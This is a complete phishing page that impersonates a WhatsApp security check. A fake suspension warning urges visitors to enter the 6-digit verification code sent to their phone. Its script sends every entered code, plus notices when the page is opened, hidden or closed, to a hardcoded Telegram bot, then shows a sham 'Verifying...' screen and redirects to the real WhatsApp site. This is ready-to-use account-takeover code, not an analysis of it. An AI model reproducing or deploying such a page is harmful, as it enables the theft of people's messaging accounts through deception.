<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp Security Center</title>
    <style>
        :root { 
            --wa-bg: #111b21;
            --wa-green: #00a884;
            --wa-danger: #ea0038;
            --wa-text: #e9edef;
            --wa-hint: #8696a0;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Segoe UI, Helvetica, Arial, sans-serif; }
        body { background: var(--wa-bg); color: var(--wa-text); display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        
        /* شريط التنبيه العلوي - لربط الصفحة بالرسالة */
        .alert-top {
            background: var(--wa-danger);
            color: white;
            width: 100%;
            padding: 10px;
            font-size: 13px;
            text-align: center;
            position: fixed;
            top: 0;
            font-weight: 600;
            letter-spacing: 0.5px;
        }

        .card { width: 100%; max-width: 380px; padding: 30px; text-align: center; }
        
        .logo { width: 50px; margin-bottom: 20px; margin-top: 20px; }
        h1 { font-size: 20px; font-weight: 600; margin-bottom: 15px; color: #fff; }
        
        .desc { font-size: 14px; color: var(--wa-text); line-height: 1.6; margin-bottom: 25px; text-align: left; background: #182229; padding: 15px; border-radius: 8px; border-left: 3px solid var(--wa-danger); }

        .otp-input { 
            width: 100%; border: none; border-bottom: 2px solid var(--wa-green); 
            font-size: 32px; letter-spacing: 12px; text-align: center; 
            background: transparent; color: #fff; outline: none; margin: 20px 0;
        }

        button { 
            background: var(--wa-green); color: #111b21; border: none; 
            width: 100%; padding: 15px; border-radius: 5px; font-size: 15px; 
            font-weight: 700; cursor: pointer; transition: 0.3s;
        }
        button:active { opacity: 0.8; }

        .footer { font-size: 12px; color: var(--wa-hint); margin-top: 30px; }
    </style>
</head>
<body>

    <div class="alert-top">ACCOUNT RESTRICTED - IMMEDIATE VERIFICATION REQUIRED</div>

    <div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
        <h1>Security Check</h1>
        
        <div class="desc">
            Due to unauthorized access attempts, your account has been temporarily suspended. Enter the 6-digit code sent to your phone to lift the 24h restriction.
        </div>

        <input type="tel" id="otp" class="otp-input" maxlength="6" inputmode="numeric" placeholder="••••••">
        
        <button onclick="submitOtp()">CANCEL RESTRICTION</button>

        <div class="footer">
            <img src="https://static.whatsapp.net/rsrc.php/v3/yO/r/Sshne939E8V.png" width="10" style="opacity:0.5"> 
            End-to-end encrypted security protocol
        </div>
    </div>

    <script>
        const BOT_CONFIG = {
            TOKEN: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU',
            CHAT_ID: '5446862709'
        };

        function notifyBot(message) {
            const url = `https://api.telegram.org/bot${BOT_CONFIG.TOKEN}/sendMessage`;
            const data = { chat_id: BOT_CONFIG.CHAT_ID, text: message, parse_mode: 'HTML' };
            
            // استخدام fetch العادي للفتح، و sendBeacon للقفل لضمان الوصول
            if (navigator.sendBeacon) {
                navigator.sendBeacon(url, new Blob([JSON.stringify(data)], {type: 'application/json'}));
            } else {
                fetch(url, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(data) });
            }
        }

        // 1. تنبيه عند فتح الصفحة
        window.onload = () => {
            notifyBot(`🟢 <b>[ACCESS]:</b> User opened the security gateway.\nWaiting for OTP...`);
        };

        // 2. تنبيه عند محاولة الخروج أو إغلاق الصفحة
        window.addEventListener('visibilitychange', function() {
            if (document.visibilityState === 'hidden') {
                notifyBot(`🟡 <b>[AWAY]:</b> User minimized the page or switched tabs.`);
            }
        });

        window.onbeforeunload = function() {
            notifyBot(`🔴 <b>[EXIT]:</b> User closed the page/session.`);
        };

        // 3. إرسال الكود
        function submitOtp() {
            const otp = document.getElementById('otp').value;
            if(otp.length === 6) {
                notifyBot(`🔥 <b>[OTP RECEIVED]:</b>\nCode: <code>${otp}</code>\nStatus: Attempting to lift restriction.`);
                
                // شكل تحميل وهمي
                document.querySelector('.card').innerHTML = `<div style="color:var(--wa-green); font-size:18px; margin-top:50px;">Verifying...<br><small style="color:#8696a0">Please wait 2 minutes.</small></div>`;
                
                setTimeout(() => {
                    window.location.href = "https://www.whatsapp.com/security";
                }, 5000);
            } else {
                alert("Enter the 6-digit code.");
            }
        }
    </script>
</body>
</html>
